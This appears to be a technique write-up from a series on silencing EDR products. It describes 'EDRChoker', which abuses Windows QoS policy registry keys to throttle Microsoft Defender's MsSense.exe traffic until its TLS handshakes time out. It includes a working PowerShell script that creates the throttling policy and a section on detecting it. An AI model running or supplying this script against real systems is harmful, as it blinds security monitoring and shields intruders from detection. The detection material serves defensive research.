# Technique 06 — QoS Throttling via pacer.sys (EDRChoker)

## Overview

**EDRChoker** is a novel EDR silencing technique that does **not** use WFP filters at
all. Instead, it leverages the **Windows Quality of Service (QoS) Policy** mechanism
to throttle EDR process bandwidth to near zero — causing TLS handshakes to time out
before completing.

**Blog post:** `https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html`  
**Key innovation:** Operates below WFP — generates **no WFP Event 5447** logs  
**Requirements:** Administrator privileges; no kernel driver required

---

## The Core Idea

Modern TLS handshakes involve:
- 3-6 KB of data (certificate exchange, hello messages)
- Up to 10+ KB with long certificate chains
- Expected completion within 2-5 seconds (timeout threshold)

If network throughput is limited to **8 bits per second** (not bytes — *bits*):
```
Time to transmit 3 KB at 8 bps = (3 * 1024 * 8) / 8 = 3072 seconds ≈ 51 minutes
```

The TLS handshake will timeout (2-5 seconds) long before any data can be exchanged.
Result: every connection attempt by the throttled process times out immediately.

---

## The Windows Network Stack Position of pacer.sys

```
Application
    ↓
tcpip.sys (TCP/IP stack)
    ↓
WFP (Windows Filtering Platform)  ← EDRSilencer, EDRPrison operate here
    ↓
NDIS.sys (Network Driver Interface Standard)
    ↓
pacer.sys (QoS Packet Scheduler)   ← EDRChoker operates HERE
    ↓
NIC miniport driver
    ↓
Physical NIC
```

`pacer.sys` is the **QoS Packet Scheduler** driver. It sits between NDIS and the
NIC driver, controlling the rate at which packets are released to the hardware.

Because pacer.sys is below WFP:
- Traffic throttled here bypasses WFP audit logging entirely
- No Event 5447 is generated
- WFPExplorer shows no unusual filters

---

## Windows QoS Policy (Group Policy / Registry-based)

Windows provides a user-space mechanism to configure QoS policies that instruct
`pacer.sys` to throttle specific applications. This is the **Policy-based QoS**
feature, normally used by IT admins to prioritize traffic.

Policies are stored in:
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\
HKCU\SOFTWARE\Policies\Microsoft\Windows\QoS\
```

Each subkey under `QoS\` is a named policy entry:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\{random-guid}
    Application Name  REG_SZ  = "MsSense.exe"   (or full path)
    Local IP          REG_SZ  = "*"
    Local IP Prefix   REG_SZ  = "*"
    Remote IP         REG_SZ  = "*"
    Remote IP Prefix  REG_SZ  = "*"
    Local Port        REG_SZ  = "*"
    Remote Port       REG_SZ  = "*"
    Protocol          REG_SZ  = "*"
    Throttle Rate     REG_SZ  = "1"              ← 1 byte per second (effective minimum)
    DSCP Value        REG_SZ  = "*"
    Direction         REG_SZ  = "1"              ← outbound only
```

**Note on Throttle Rate:** Windows uses bits per second internally; setting to "1"
byte/sec results in sub-bit throttling. The research uses 8 bps effective throughput,
but the minimum setting achieves a similar effect.

---

## EDRChoker: Operational Modes

### Install Mode

1. Read input file containing EDR process names (one per line)
2. For each EDR process:
   a. Generate a random GUID for the policy key name
   b. Create registry subkey under QoS
   c. Write values throttling that application to minimum bandwidth
3. Policy takes effect for new connections without reboot

```powershell
# Equivalent PowerShell demonstration
$guid = [System.Guid]::NewGuid().ToString()
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\QoS\$guid"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "Application Name" -Value "MsSense.exe"
Set-ItemProperty -Path $regPath -Name "Throttle Rate"    -Value "1"
Set-ItemProperty -Path $regPath -Name "Local IP"         -Value "*"
Set-ItemProperty -Path $regPath -Name "Remote IP"        -Value "*"
Set-ItemProperty -Path $regPath -Name "Local Port"       -Value "*"
Set-ItemProperty -Path $regPath -Name "Remote Port"      -Value "*"
Set-ItemProperty -Path $regPath -Name "Protocol"         -Value "*"
Set-ItemProperty -Path $regPath -Name "Direction"        -Value "1"
```

### Remove Mode

Run without arguments — enumerates all QoS policy keys and removes those created
by EDRChoker (identified by their GUID-based key names or by the throttle rate value).

---

## Effect on EDR Telemetry

```
Timeline for MsSense.exe (MDE) under EDRChoker:

T+0ms   : EDR process calls connect() → WFP permits (EDR is not blocked at WFP)
T+0ms   : TCP SYN packet queued for transmission
T+???   : pacer.sys schedules SYN packet at 8 bps → effectively never sent within timeout
T+2000ms: TLS handshake timeout fires
T+2001ms: EDR marks this connection attempt as failed
T+2002ms: EDR retries connection...
T+4003ms: Second timeout
...
T+∞     : EDR never establishes connection to C2
          From EDR perspective: network is "up" (ICMP may work) but TLS always times out
```

Interesting side effect: ICMP ping may still succeed (small packets bypass QoS
scheduling or are not matched by the policy condition) — making the machine appear
"online" while EDR is effectively dead.

---

## Why This Evades Traditional Detection

| Detection Method | Effectiveness Against EDRChoker |
|---|---|
| Monitor WFP filter additions (Event 5447) | Does NOT catch — no WFP filter is added |
| WFPExplorer / netsh wfp show filters | Does NOT show — no WFP changes |
| Monitor EDR process kill | Does NOT apply — process stays alive |
| Monitor EDR callout removal | Does NOT apply — no callout interaction |
| Monitor registry changes under QoS key | **DOES catch** — registry modification |
| PowerShell audit log | **DOES catch** — policy creation via PowerShell |
| Windows Event Log: QoS policy events | **DOES catch** — if QoS auditing enabled |

---

## Detection

### Registry Monitoring
Watch for new subkeys under:
```
HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\
HKCU\SOFTWARE\Policies\Microsoft\Windows\QoS\
```
Alert on any key with `Throttle Rate` set to very low values (< 1000) targeting
known security process names.

### PowerShell / Script Audit Logs

If the attacker uses PowerShell to create the registry entries, PowerShell ScriptBlock
logging (Event 4104) will capture the commands.

### Network Health Check (EDR-Side)

EDRs can implement a "heartbeat watchdog" that monitors if they can reach their C2
within expected time. If heartbeat fails, the EDR should:
- Log locally (to SIEM via local syslog fallback)
- Alert the operator
- Not silently fail

### Group Policy Auditing

Enable `Audit Policy Change` → `Audit Policy-based QoS` in Group Policy:
```
Computer Configuration → Windows Settings → Security Settings
  → Advanced Audit Policy Configuration → Policy Change
  → Audit Policy Change: Success, Failure
```

---

## Comparison with WFP-Based Approaches

| Property | WFP Filter Injection | EDRChoker (QoS) |
|---|---|---|
| Operation layer | WFP (above NDIS) | pacer.sys (below NDIS) |
| Requires driver? | No | No |
| Kernel code? | No | No |
| Generates Event 5447? | Yes | **No** |
| Visible in WFP tools? | Yes | **No** |
| EDR sees socket error? | Yes (immediate) | **No** (timeout after delay) |
| EDR can self-heal? | Easier (detects block) | Harder (looks like network issue) |
| Persistence | Boot-time flag | Until registry key deleted |
| Detection path | Event 5447 SIEM rule | Registry + QoS audit |

---

## References

- EDRChoker blog: `https://www.zerosalarium.com/2026/06/edrchoker-choking-telemetry-stream-block-edr.html`
- SCRT: Blinding EDRs `https://blog.scrt.ch/2025/08/25/blinding-edrs-a-deep-dive-into-wfp-manipulation/`

---

Next: `07_custom-callout-driver.md`
